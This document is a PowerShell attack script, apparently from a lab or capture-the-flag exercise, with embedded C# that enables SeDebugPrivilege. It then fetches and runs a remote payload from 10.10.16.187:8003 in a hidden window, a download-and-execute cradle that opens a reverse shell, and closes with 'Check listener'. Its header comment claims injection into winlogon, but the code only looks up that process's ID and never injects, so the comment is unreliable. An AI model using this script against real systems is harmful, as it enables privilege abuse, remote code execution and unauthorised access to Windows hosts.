# Enable SeDebugPrivilege and inject into winlogon
$definition = @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
public class Injector {
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TokPriv1Luid NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CloseHandle(IntPtr hObject);
    public const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
    public const uint TOKEN_QUERY = 0x0008;
    public const uint SE_PRIVILEGE_ENABLED = 0x00000002;
    public const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
    [StructLayout(LayoutKind.Sequential, Pack=1)]
    public struct TokPriv1Luid { public int Count; public long Luid; public int Attr; }
    public static bool Enable() {
        IntPtr hToken;
        if (!OpenProcessToken(Process.GetCurrentProcess().Handle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out hToken)) return false;
        TokPriv1Luid tp; tp.Count = 1; tp.Luid = 0; tp.Attr = (int)SE_PRIVILEGE_ENABLED;
        if (!LookupPrivilegeValue(null, "SeDebugPrivilege", out tp.Luid)) return false;
        bool result = AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
        CloseHandle(hToken);
        return result;
    }
}
"@
Add-Type $definition
[Injector]::Enable() | Out-Null

$winlogon = Get-Process -Name winlogon | Select-Object -First 1
Write-Host "Target PID: $($winlogon.Id)"

# Launch reverse shell that will run with the enabled privilege
$cmd = "powershell.exe -nop -w hidden -c `"IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.187:8003/shell.ps1')`""
Start-Process powershell -ArgumentList "-nop -w hidden -c `"$cmd`"" -WindowStyle Hidden
Write-Host "Check listener"
